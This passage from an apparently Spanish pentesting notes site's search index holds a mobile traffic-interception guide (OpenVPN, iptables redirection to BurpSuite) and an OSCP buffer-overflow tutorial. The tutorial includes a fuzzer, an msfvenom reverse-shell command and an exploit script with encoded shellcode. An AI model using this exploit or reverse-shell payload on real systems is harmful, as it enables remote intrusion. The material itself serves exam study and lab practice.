header_uncompressed_length)\n\n        decompressed = lz4.block.decompress(payload, uncompressed_size=header_uncompressed_length)\n\n        with open(output_filepath, \"wb\") as output_file:\n            output_file.write(decompressed)\n            output_file.close()\n        print(\"result written to file\")\n</code></pre>"},{"location":"Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/","title":"Gu\u00eda Definitiva para Captura de Tr\u00e1fico","text":""},{"location":"Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/#openvpn","title":"OpenVPN","text":"<p>Existen m\u00faltiples escenarios en donde se encontrar\u00e1n diferentes obst\u00e1culos que se deber\u00e1n sortear para poder capturar el tr\u00e1fico de una aplicaci\u00f3n, desde el lenguaje/framework utilizado para desarrollar el aplicativo, hasta protecciones dise\u00f1adas con el fin de brindar una capa o m\u00faltiples capas extra de seguridad, tales como el SSLPinning.</p> <p>Este m\u00e9todo lo he ocupado como \u00faltimo recurso a la hora de realizar pruebas de penetraci\u00f3n a aplicaciones m\u00f3viles, en el caso de verme restringido en tiempo, o que me encuentre con protecciones las cuales me est\u00e9 resultando dif\u00edcil evadir.</p> <p>Al tiempo que encontr\u00e9 este m\u00e9todo, se me hab\u00eda presentado un caso en d\u00f3nde no estaba pudiendo capturar el tr\u00e1fico y hab\u00eda podido identificar que el framework utilizado para la aplicaci\u00f3n que estaba evaluando era Flutter. Y es que este framework en particular suele evadir de alguna manera las configuraciones establecidas en la secci\u00f3n de proxies de los dispositivos, o al menos eso pude asumir dada la investigaci\u00f3n y que al realizar las configuraciones pertinentes para capturar el tr\u00e1fico, no se mostraban errores relacionados con certificados o comunicaciones cifradas por parte del proxy (BurpSuite).</p> <p>Sin m\u00e1s que mencionar al respecto, se considerar\u00e1 que se usa un servidor OpenVPN hosteado en una m\u00e1quina virtual de VMWare en modo NAT, ejemplificando la configuraci\u00f3n con el siguiente diagrama:</p> <p></p>"},{"location":"Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/#maquina-virtual","title":"M\u00e1quina Virtual","text":"<p>La instalaci\u00f3n del servidor OpenVPN es bastante directa por medio de este script. El script detecta Kali como un sistema operativo Debian, pero falla en determinar la versi\u00f3n, por lo que se puede eliminar la secci\u00f3n de <code>exit</code> en la verificaci\u00f3n de la versi\u00f3n con los siguientes comandos. Si el script falla, se recomienda eliminar la l\u00ednea manualmente.</p> <pre><code>wget https://git.io/vpn -O openvpn-install.sh\nsed -i \"$(($(grep -ni \"debian is too old\" openvpn-install.sh | cut  -d : -f 1)+1))d\" ./openvpn-install.sh\nchmod +x openvpn-install.sh\nsudo ./openvpn-install.sh\n</code></pre> <p>A excepci\u00f3n de que se quiera configurar algo en espec\u00edfico se pueden usar los valores predeterminados del script, sin embargo, ser\u00e1 importe se\u00f1alar la IP del host principal (en este caso, la m\u00e1quina que hostea VMWare), por ejemplo:</p> <pre><code>Welcome to this OpenVPN road warrior installer!\n\nThis server is behind NAT. What is the public IPv4 address or hostname?\nPublic IPv4 address / hostname [187.189.145.250]: 10.10.10.27 # IP asignada por mi router\n\nWhich protocol should OpenVPN use?\n   1) UDP (recommended)\n   2) TCP\nProtocol [1]: \n\nWhat port should OpenVPN listen to?\nPort [1194]: \n\nSelect a DNS server for the clients:\n   1) Current system resolvers\n   2) Google\n   3) 1.1.1.1\n   4) OpenDNS\n   5) Quad9\n   6) AdGuard\nDNS server [1]: \n\nEnter a name for the first client:\nName [client]: iPhonePT\n\nOpenVPN installation is ready to begin.\nPress any key to continue...\n</code></pre> <p>El script crear\u00e1 un archivo de configuraci\u00f3n de OpenVPN ubicado en el directorio <code>/root</code>, el cu\u00e1l posteriormente se descargar\u00e1 en el cliente (celular).</p> <pre><code>[...Snip...]\nFinished!\n\nThe client configuration is available in: /root/iPhonePT.ovpn\nNew clients can be added by running this script again.\n</code></pre> <p>Se inicia el servicio de OpenVPN:</p> <pre><code>sudo service openvpn start\n</code></pre> <p>Se transfiere el archivo de configuraci\u00f3n, en este caso se usar\u00e1 un servidor web temporal:</p> <pre><code>sudo python -m http.server --directory /root\n</code></pre> <p>Se dan de alta los puertos a los que se les realizar\u00e1 el redireccionamiento en la configuraci\u00f3n de red de VMWare yendo a <code>Edit &gt; Virtual Network Editor</code>.</p> <p></p> <p>Identificar la red a ocupar, este caso se ocupar\u00e1 la red en NAT y dar click en <code>Change Settings</code>.</p> <p></p> <p>Dar click en configuraci\u00f3n de NAT, seleccionando la red que se ocupar\u00e1.</p> <p></p> <p>Seleccionar <code>Add...</code> y configurar el redireccionamiento hacia el servidor HTTP montado indicando el puerto expuesto, protocolo e IP de la m\u00e1quina virtual. Se ocupar\u00e1 el mismo puerto en la m\u00e1quina host.</p> <p></p> <p>Repetir el mismo procedimiento para el puerto del servidor OpenVPN.</p> <p></p> <p>Seleccionar <code>Ok</code> para guardar cambios.</p> <p></p> <p>Es importante se\u00f1alar que si se cuenta con alg\u00fan servicio de firewall/antivirus se tendr\u00e1n que realizar las configuraciones pertinentes, no mostradas en esta gu\u00eda, para alcanzar los servicios desde el host principal.</p>"},{"location":"Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/#ios","title":"iOS","text":"<p>A partir de este punto ser\u00eda posible alcanzar los servicios expuestos de la m\u00e1quina virtual, por lo que se acceder\u00e1 al servidor web desde el dispositivo para descargar el archivo de configuraci\u00f3n de OpenVPN.</p> <p></p> <p>Al seleccionar el archivo, se podr\u00e1 abrir directamente en la aplicaci\u00f3n cliente de OpenVPN, pudiendo variar de la versi\u00f3n del navegador.</p> <p></p> <p>Se seleccionar\u00e1 <code>ADD</code> para a\u00f1adir el perfil al cliente.</p> <p></p> <p>Seleccionar <code>CONNECT</code> para realizar la conexi\u00f3n al servidor.</p> <p></p> <p>Se podr\u00e1 verificar si se realiz\u00f3 la conexi\u00f3n satisfactoriamente si se observan datos de sal\u00edda y de entrada en las estad\u00edsticas de conexi\u00f3n, adicionalmente, se podr\u00e1 ver el \u00edcono de VPN en la barra superior del dispositivo.</p> <p></p>"},{"location":"Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/#man-in-the-middle","title":"Man In The Middle","text":"<p>Restar\u00e1 a\u00f1adir las reglas de redirecci\u00f3n para las interfaces involucradas para redirijir el tr\u00e1fico HTTP y HTTPS, mediante las l\u00edneas de comando, asumiendo que el proxy usar\u00e1 el puerto 8080:</p> <pre><code>sudo iptables -t nat -A PREROUTING -i tun0 -p tcp --dport 80 -j REDIRECT --to-port 8080\nsudo iptables -t nat -A PREROUTING -i tun0 -p tcp --dport 443 -j REDIRECT --to-port 8080\nsudo iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -o eth0 -j MASQUERADE # Utilizar la red en la que se encuentra el host principal\n</code></pre> <p>Finalmente, se configurar\u00e1 el proxy para escuchar en todas las interfaces.</p> <p></p> <p>Y habilitar la opci\u00f3n para soporte de <code>Invisible Proxy</code>.</p> <p></p> <p>En este momento, al utilizar el navegador o cualquier aplicaci\u00f3n deber\u00eda ser posile visualizar el tr\u00e1fico dentro de Burpsuite.</p>"},{"location":"Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/#referencias","title":"Referencias","text":"<ul> <li>https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/</li> </ul>"},{"location":"Gu%C3%ADas/OSCP%20BOF/","title":"Metodolog\u00eda OSCP BOF","text":""},{"location":"Gu%C3%ADas/OSCP%20BOF/#indice","title":"\u00cdndice","text":"<ul> <li>Objetivo</li> <li>Configuraci\u00f3n de ambiente de pr\u00e1ctica</li> <li>Firewall<ul> <li>Traza ICMP</li> </ul> </li> <li>Deshabilitado de DEP</li> <li>Instalaci\u00f3n de herramientas (Mona)</li> <li>Generaci\u00f3n de workspace para <code>mona.py</code> (opcional)</li> <li>Fuzzing</li> <li>Plantilla de fuzzer</li> <li>Identificar Bad Chars</li> <li>Manual<ul> <li>Colecci\u00f3n plana</li> <li>Colecci\u00f3n en arreglo</li> </ul> </li> <li>Autom\u00e1tico</li> <li>B\u00fasqueda de direcci\u00f3n</li> <li>B\u00fasqueda de apuntador en dll</li> <li>Generaci\u00f3n de shellcode</li> <li>Generaci\u00f3n de exploit</li> <li>Ejemplo de exploit final</li> </ul>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#objetivo","title":"Objetivo","text":"<p>Como parte de la pr\u00e1ctica para el examen me di a la tarea de realizar esta gu\u00eda para futuras consultas y aclaraci\u00f3n de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificaci\u00f3n. Adicional, para tener un compendio m\u00e1s pr\u00e1ctico realice una s\u00edntesis de los comandos utilizados disponibles en esta Cheat Sheet.</p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#configuracion-de-ambiente-de-practica","title":"Configuraci\u00f3n de ambiente de pr\u00e1ctica","text":"<ol> <li>Deshabilitar firewall y/o habilitar reglas para comunicaci\u00f3n a trav\u00e9s de red.</li> <li>Deshabilitar protecci\u00f3n DEP de Windows.</li> <li>Instalaci\u00f3n de herramientas (binario, immunity debugger, <code>mona.py</code>).</li> <li>Generaci\u00f3n de workspace para <code>mona.py</code>.</li> </ol>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#firewall","title":"Firewall","text":""},{"location":"Gu%C3%ADas/OSCP%20BOF/#traza-icmp","title":"Traza ICMP","text":"<p>En la secci\u00f3n de configuraci\u00f3n avanzada habilitar reglas tanto de entrada como de salida de ICMP v4 y v6 para permitir comunicaci\u00f3n entre la m\u00e1quina que se ocupar\u00e1 para debuggear el binario y la m\u00e1quina de donde se lanzar\u00e1 el exploit.</p> <p></p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#deshabilitado-de-dep","title":"Deshabilitado de DEP","text":"<p>En un command prompt como administrador ejecutar: <code>bcdedit.exe /set {current} nx AlwaysOff</code> para deshabilitar la prevenci\u00f3n de ejecuci\u00f3n de datos (DEP). Despu\u00e9s de ejecutarlo y reiniciar el sistema se puede validar que se deshabilit\u00f3 correctamente entrando a <code>Panel de Control &gt; Sistema y seguridad &gt; Sistema &gt; Configuraci\u00f3n avanzada del sistema &gt; Opciones avanzadas &gt; Configuraci\u00f3n (de rendimiento) &gt; Prevenci\u00f3n de ejecuci\u00f3n de datos</code> este deber\u00e1 salir sombreado de gris.</p> <p></p> <ol> <li>Configuraci\u00f3n avanzada del sistema.</li> <li>Configuraci\u00f3n de rendimiento.</li> <li>Pesta\u00f1a de prevenci\u00f3n de ejecuci\u00f3n de datos.</li> <li>Sombreado gris de correcto deshabilitado.</li> </ol>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#instalacion-de-herramientas-mona","title":"Instalaci\u00f3n de herramientas (Mona)","text":"<p>Para a\u00f1adir el script de <code>mona.py</code> a inmmunity debugger, es necesario descargar el script del repositorio y meterlo en la ruta <code>C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands</code>.</p> <p></p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#generacion-de-workspace-para-monapy-opcional","title":"Generaci\u00f3n de workspace para <code>mona.py</code> (opcional)","text":"<p>Para facilitar el uso de <code>mona.py</code>, se puede generar un entorno de trabajo (a secas es una carpeta) que contendr\u00eda lo que <code>mona.py</code> genere a partir de los comandos que se utilicen (payloads, patrones, badchars, etc). Ejecutando <code>!mona config -set workingfolder C:\\Users\\SrRequiem\\Desktop\\%p</code> se indicar\u00eda el lugar y a partir del primer comando de <code>mona.py</code> que genere archivos, se podr\u00e1 ver reflejado en el sistema de archivos.</p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#fuzzing","title":"Fuzzing","text":"<p>En esta secci\u00f3n se realiza la b\u00fasqueda del punto de quiebre del binario. Identificando el n\u00famero de caracteres que causen un fallo de segmentaci\u00f3n.</p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#plantilla-de-fuzzer","title":"Plantilla de fuzzer","text":"<pre><code>#from pwn import *\nimport socket, sys, time\n\nif len(sys.argv) &lt; 2:\n   print \"\\n[!] Uso: python \" + sys.argv[0] + \"&lt;ip-address&gt; \" + \"&lt;remote-port&gt;\\n\"\n   sys.exit(0)\n# Variables globales\nip_address = sys.argv[1]\nrport = int(sys.argv[2])\n\nif __name__ == '__main__':\n   contador = 100\n   #p1 = log.progress(\"Data\") Log de datos en pwntools\n   while True:\n      #p1.status(f\"Enviando {contador} bytes.\") Log de datos en pwntools\n      print \"Enviando %s bytes.\" % contador\n      buffer = 'A' * contador\n      try:\n         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n         s.connect((ip_address, rport))\n\n         data = s.recv(1024)\n         #s.send(\"USER srrequiem\\r\\n\")\n         #data = s.recv(1024)\n         s.send(\"%s\\r\\n\" % buffer)\n         data = s.recv(1024)\n         contador += 100\n         #En algunas ocasiones no suele romperse la conexion lo que evita entrar\n         #al codigo de la excepcion por lo que se puede considerar meter un sleep\n         #para visualizar en que valor de la iteracion se pausa la ejecucion del binario\n         time.sleep(1)\n      except Exception as ex:\n         print \"\\n[!] Ha habido un error de conexion\\n\"\n         print ex\n         sys.exit(1)\n</code></pre> <p>Por medio del script se puede buscar el cambio del <code>EIP</code> de manera autom\u00e1tica.</p> <p></p> <p>Generacion de patr\u00f3n</p> <p><code>msf-pattern_create -l &lt;longitud de bytes&gt;</code></p> <p><code>!mona pattern_create &lt;longitud de bytes&gt;</code></p> <p>Despu\u00e9s de provocar el fallo con el patr\u00f3n, la direcci\u00f3n <code>EIP</code> se sustituir\u00eda con un valor del segmento de nuestro patr\u00f3n. El valor que contenga <code>EIP</code> ahora lo identificaremos para saber el offset espec\u00edfico.</p> <p></p> <p>Identificaci\u00f3n offset</p> <p><code>msf-pattern_create -l &lt;EIP&gt;</code></p> <p><code>!mona pattern_offset &lt;EIP&gt;</code></p> <p></p> <ol> <li>Offset.</li> <li>EIP.</li> </ol> <p>Nota: Siempre corroborar con un payload propio modificando despu\u00e9s del offset un valor que se identifique facilmente. Ejemplo: 1052 'A' y 4 'B' en este caso el <code>EIP</code> valdr\u00eda <code>42424242</code></p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#identificar-bad-chars","title":"Identificar Bad Chars","text":""},{"location":"Gu%C3%ADas/OSCP%20BOF/#manual","title":"Manual","text":"<p>Si bien es bueno saber el proceso que se realiza, es una tarea que consume mucho tiempo y que existe una gran posibilidad de cometer errores al realizarlo ya que es muy f\u00e1cil perder alg\u00fan byte de vista muy f\u00e1cil.</p> <p>El proceso se centra en enviar el payload con los badchars y directamente seguir los caracteres ASCII obtenidos del <code>ESP</code> y buscar cuales son los que no se visualizan correctamente, identificandolos as\u00ed uno a uno. Se puede generar la colecci\u00f3n de bytes con <code>mona.py</code> con el comando <code>!mona bytearray</code> dentro de Immunity Debugger para tener la colecci\u00f3n y poder incorporarla al payload.</p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#coleccion-plana","title":"Colecci\u00f3n plana","text":"<p><code>\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff</code></p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#coleccion-en-arreglo","title":"Colecci\u00f3n en arreglo","text":"<pre><code>badchars = (\n  \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n  \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n  \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n  \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n  \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n  \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n  \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n  \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n  \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n  \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n  \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n  \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n  \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n  \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n  \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n  \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n</code></pre> <p>Despu\u00e9s de enviar el payload con los badchars y lograr la pausa del programa podemos seguir el contenido del <code>ESP</code> d\u00e1ndo click derecho en el registro y seleccionando la opci\u00f3n <code>Follow in Dump</code>, de la secci\u00f3n ubicada en la esquina inferior izquierda se nos desplegar\u00e1 el contenido del registro para poder identificar los badchars manualmente.</p> <p></p> <p>Se anexan ejemplos de c\u00f3mo se ver\u00edan los badchars en el dump de hexadecimal (secci\u00f3n inferior izquierda de Immunity Debugger).</p> <p></p> <p></p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#automatico","title":"Autom\u00e1tico","text":"<p>El proceso se puede optimizar usando <code>mona.py</code> de manera iterativa, con los siguientes comandos <code>mona.py</code> nos devolver\u00e1 los badchars identificados.</p> <ol> <li><code>!mona bytearray</code>: Generar\u00e1 archivos con arreglo de badchars.</li> <li><code>!mona compare -f &lt;ubicacion de byte array .bin&gt; -a &lt;direcci\u00f3n de ESP&gt;</code>: Comparar\u00e1 los badchars contenidos respecto al payload ubicado en el <code>ESP</code> (recordando que payload = filler + eip + badchars).</li> <li><code>!mona bytearray -cpb '\\x00'</code>: Generar\u00e1 archivos con arreglo de badchars exceptuando los indicados.</li> <li>Repetir proceso hasta encontrar todos los badchars.</li> </ol>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#busqueda-de-direccion","title":"B\u00fasqueda de direcci\u00f3n","text":"<p>Aqu\u00ed se realiza la b\u00fasqueda de la instrucci\u00f3n <code>JMP ESP</code> (valores hexadecimales <code>\\xff\\xe4</code>) en las dlls del binario, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por <code>mona.py</code> en <code>False</code>).</p> <p>Nota: se puede hacer uso de <code>msf-nasm_shell</code> para ver el valor de los <code>OP codes</code> (en este caso <code>jmp ESP</code>) en caso que se requiera.</p> <p></p> <p>Comando de mona.py</p> <p><code>!mona modules</code></p> <p>Ejemplo</p> <p></p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#busqueda-de-apuntador-en-dll","title":"B\u00fasqueda de apuntador en dll","text":"<p>Aqu\u00ed se realiza una b\u00fasqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucci\u00f3n <code>\\xff\\xe4</code>.</p> <p>Comando de mona.py</p> <p><code>!mona find -s \"\\xff\\xe4\" -m &lt;nombre de dll&gt;</code></p> <p>Se desplegar\u00e1 una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripci\u00f3n de la tabla contener\u00e1 direcciones con permisos de lectura y ejecuci\u00f3n (<code>PAGE_EXECUTE_READ</code>); y de escritura solamente (<code>PAGE_READ_ONLY</code>), hay que tomar en cuenta s\u00f3lo aquellas que cuenten con ejecuci\u00f3n (<code>PAGE_EXECUTE_READ</code>). Y tambi\u00e9n desplegar\u00e1 las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (<code>False</code>).</p> <p></p> <ol> <li>Comando.</li> <li>Direcciones \u00fatiles para usar en EIP (buscar aquellas que en el valor de la direcci\u00f3n no contenga ning\u00fan badchar).</li> <li>Permisos.</li> <li>Protecciones.</li> </ol>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#generacion-de-shellcode","title":"Generaci\u00f3n de shellcode","text":"<p>Aqu\u00ed se generar\u00e1 el shellcode a utilizar despu\u00e9s de la sustituci\u00f3n del valor que se asigne a la <code>EIP</code>.</p> <p>Comando de ejemplo</p> <p><code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\\x00' EXITFUNC=thread -i 3 -f python &gt; scode.txt</code></p> <p>Tener en consideraci\u00f3n: - Sistema operativo. - Arquitectura. - Payload. - Formato (python, c, exe, etc). - Variables de escucha y/o comando a ejecutar. - Encoding (extra: <code>-i 3</code> para n\u00famero de iteraciones para encodear). - BadChars. - Funci\u00f3n de salida (para evitar que el proceso termine usar <code>seh</code> o <code>thread</code>).</p> <p>Si se da el caso que los badchars sean bastantes tal que la generaci\u00f3n del shellcode no se realice satisfactoriamente, considerar quitar el encoder <code>x86/shikata_ga_nai</code> para que autom\u00e1ticamente se utilic\u00e9 el encoder que cumpla con los requisitos (colecci\u00f3n de badchars a evitar).</p>"},{"location":"Gu%C3%ADas/OSCP%20BOF/#generacion-de-exploit","title":"Generaci\u00f3n de exploit","text":""},{"location":"Gu%C3%ADas/OSCP%20BOF/#ejemplo-de-exploit-final","title":"Ejemplo de exploit final","text":"<pre><code>from struct import pack\nimport socket, sys\n\nif len(sys.argv) &lt; 2:\n    print \"\\n [!] Uso: python \" + sys.argv[0] + \"&lt;ip-address&gt;\" + \"&lt;remote-port&gt; \\n\"\n    sys.exit(0)\n\nip_address = sys.argv[1]\nrport = int(sys.argv[2])\nshellcode =  b\"\"\nshellcode += b\"\\xb8\\x36\\xda\\x75\\x0f\\xda\\xd5\\xd9\\x74\\x24\\xf4\\x5b\\x2b\"\nshellcode += b\"\\xc9\\xb1\\x5f\\x83\\xc3\\x04\\x31\\x43\\x10\\x03\\x43\\x10\\xd4\"\nshellcode += b\"\\x2f\\xce\\x68\\xaf\\x10\\x8c\\xac\\x01\\x49\\x9b\\x76\\x69\\x30\"\nshellcode += b\"\\x55\\xbe\\x20\\x9d\\xa4\\x1a\\x57\\x9d\\x2d\\x66\\x54\\xfb\\xa0\"\nshellcode += b\"\\x75\\xc8\\xf6\\x32\\x68\\x08\\x59\\x9b\\x32\\x1d\\xb8\\x35\\x8a\"\nshellcode += b\"\\x2e\\x1c\\xec\\x8c\\x49\\xea\\xa6\\xae\\xc5\\xfb\\xef\\x11\\xbd\"\nshellcode += b\"\\xa9\\x1f\\x9b\\xf3\\x51\\xc8\\x4a\\x27\\x35\\xa2\\xd1\\x60\\x03\"\nshellcode += b\"\\x55\\x72\\xf5\\xcc\\x0b\\xd2\\x2a\\xda\\x41\\x4d\\x5f\\x4f\\xb4\"\nshellcode += b\"\\x2f\\xbb\\xc6\\x88\\x45\\x5f\\x3e\\x11\\x08\\x86\\x09\\x5d\\xe7\"\nshellcode += b\"\\xf8\\x11\\x49\\x5c\\x12\\xdc\\x8e\\x66\\xa0\\x1e\\x1c\\x10\\x0a\"\nshellcode += b\"\\xf8\\xa7\\xac\\x6b\\x8d\\xd4\\x2a\\xaa\\xe6\\x5e\\x9d\\xbe\\x04\"\nshellcode += b\"\\x42\\x52\\xe0\\x71\\x86\\xc5\\xa6\\xa2\\xff\\xdf\\xcb\\x75\\x28\"\nshellcode += b\"\\x2f\\x5b\\x05\\x57\\x39\\x45\\xd2\\x7e\\x05\\xd6\\x91\\xfd\\x46\"\nshellcode += b\"\\x2c\\x31\\x66\\xea\\xbe\\x3c\\xc8\\x10\\x96\\xf6\\xcc\\x31\\xbc\"\nshellcode += b\"\\x56\\x43\\x24\\x1f\\x86\\xed\\xf2\\x59\\xa2\\x38\\x9c\\x4f\\xa1\"\nshellcode += b\"\\xc6\\x58\\x71\\xb7\\x81\\x9d\\xe3\\x25\\xb7\\xc7\\xf4\\x5c\\xa3\"\nshellcode += b\"\\x01\\xd4\\x5e\\xf2\\x1d\\x92\\x57\\x08\\x65\\xd9\\x62\\xdf\\xb4\"\nshellcode += b\"\\xdf\\xaa\\xb8\\x6a\\x61\\x82\\x87\\xfa\\x27\\x0c\\xe9\\x49\\x46\"\nshellcode += b\"\\xea\\x50\\x51\\xb6\\x6b\\xc9\\xbc\\xe4\\x95\\xff\\xf8\\x36\\x94\"\nshellcode += b\"\\x3b\\xbd\\x24\\xd9\\x9c\\xb5\\x1e\\x77\\xcb\\x31\\x84\\x2a\\xe3\"\nshellcode += b\"\\xca\\xac\\xd7\\x8c\\x12\\xed\\xa0\\x53\\xfa\\xbc\\x94\\xf3\\x9b\"\nshellcode += b\"\\xe5\\x8a\\xac\\xf3\\x48\\x1a\\x39\\x2e\\x63\\x5a\\x68\\xe9\\x85\"\nshellcode += b\"\\x93\\xde\\x3a\\x22\\x77\\x2a\\xac\\xa1\\xfa\\x96\\x7f\\x9f\\x95\"\nshellcode += b\"\\x6f\\xa3\\xe4\\x13\\x41\\x9a\\xe8\\xf6\\x97\\x6b\\x2d\\x31\\x68\"\nshellcode += b\"\\x9c\\xb1\\x2f\\xab\\xa3\\xf5\\x56\\xe9\\xf5\\xa3\\x21\\xe9\\x9c\"\nshellcode += b\"\\x19\\xaf\\x10\\x57\\xfb\\x80\\x0e\\x73\\x48\\x84\\xb1\\xb0\\xb0\"\nshellcode += b\"\\x83\\x67\\x88\\xb5\\x1d\\x0e\\x73\\xeb\\xa1\\xd1\\xdc\\xa2\\xe9\"\nshellcode += b\"\\x76\\xcc\\xd0\\x27\\x6b\\xed\\x5d\\xfc\\x02\\xcb\\x8f\\xff\\xc3\"\nshellcode += b\"\\xb2\\x8f\\xf3\\xee\\x96\\x9a\\xec\\xb1\\x73\\x55\\x47\\x82\\x70\"\nshellcode += b\"\\x10\\x32\\x53\\xbb\\xfa\\x83\\x38\\x3b\\xb0\\xea\\xd1\\xe4\\x6e\"\nshellcode += b\"\\x2f\\x7d\\x23\\xc5\\xd9\\x5d\\xfb\\x48\\x06\\x3d\\x4f\\x33\\xfe\"\nshellcode += b\"\\x03\\x9c\"\n\nif __name__ == \"__main__\":\n    #buffer = \"A\" * 1052 + pack(\"&lt;L\", 0x68a98a7b) + \"\\x83\\xEC\\x10\" + shellcode\n    buffer = \"A\" * 1052 + pack(\"&lt;L\", 0x68a98a7b) + \"\\x90\" * 16 + shellcode\n    try:\n        s = socket.socket(socket.AF_INET, 